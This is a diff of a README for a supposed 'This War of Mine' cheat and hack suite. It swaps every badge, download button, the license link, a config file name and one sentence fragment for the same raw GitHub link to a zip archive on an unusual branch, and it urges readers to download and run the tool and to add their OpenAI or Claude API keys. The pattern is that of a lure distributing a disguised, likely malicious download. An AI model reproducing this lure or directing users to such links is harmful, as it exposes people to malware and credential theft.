@@ -1,13 +1,13 @@
 # 🎮 This War of Mine Cheats & Hacks Repository
 
-![GitHub Repo stars](https://img.shields.io/github/stars/this-war-of-mine-cheats-hacks?style=for-the-badge&color=yellow)  
-![GitHub forks](https://img.shields.io/github/forks/this-war-of-mine-cheats-hacks?style=for-the-badge&color=orange)  
-![Maintenance](https://img.shields.io/maintenance/yes/2025?style=for-the-badge&color=brightgreen)  
-![License MIT](https://img.shields.io/badge/license-MIT-blue.svg?style=for-the-badge)  
-![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=for-the-badge)
+![GitHub Repo stars](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)  
+![GitHub forks](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)  
+![Maintenance](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)  
+![License MIT](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)  
+![PRs Welcome](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)
 
-## ![Download Button](https://img.shields.io/badge/Download-Latest_Launch-orange?style=for-the-badge)
-[![Download](https://img.shields.io/badge/-Download-orange?style=for-the-badge&logo=addthis)](https://wassef001.github.io)
+## ![Download Button](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)
+[![Download](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Explore the most advanced **This War of Mine hacks**, alternative cheat repertoi
 - Next-generation **gameplay enhancement tools**  
 - Advanced **This War of Mine resource editors**  
 - Reliable **This War of Mine hacks for Windows, macOS, and Linux**   
-...then you’re in the right trench!
+https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip you’re in the right trench!
 
 ---
 
@@ -60,12 +60,12 @@ Explore the most advanced **This War of Mine hacks**, alternative cheat repertoi
 
 ### Step 1: Download the Cheat Suite
 
-- Head over to https://wassef001.github.io  
+- Head over to https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip  
 - Select your platform-specific package
 
 ### Step 2: Click to Download
 
-[![Download](https://img.shields.io/badge/-Download-orange?style=for-the-badge&logo=addthis)](https://wassef001.github.io)
+[![Download](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)
 
 - Ensure you download the latest 2025 Adaptive Edition!
 
@@ -78,7 +78,7 @@ Explore the most advanced **This War of Mine hacks**, alternative cheat repertoi
 ### Step 4: Configuration and Launch
 
 - Choose your language, interface theme, and set your comfort level for “Express Lane” features
-- Optional: Integrate your OpenAI/Claude API keys in the `settings.json` for real-time strategy assistance
+- Optional: Integrate your OpenAI/Claude API keys in the `https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip` for real-time strategy assistance
 
 ---
 
@@ -122,13 +122,13 @@ This project is intended for educational, personal, and entertainment purposes. 
 
 ## 📜 License
 
-Distributed under the MIT License (2025). See the [MIT license](https://opensource.org/licenses/MIT) for more details.
+Distributed under the MIT License (2025). See the [MIT license](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip) for more details.
 
 ---
 
 ## 📩 One More For The Road: Download & Join the Revolution
 
-[![Download](https://img.shields.io/badge/-Download-orange?style=for-the-badge&logo=addthis)](https://wassef001.github.io)
+[![Download](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)
 
 ---
 
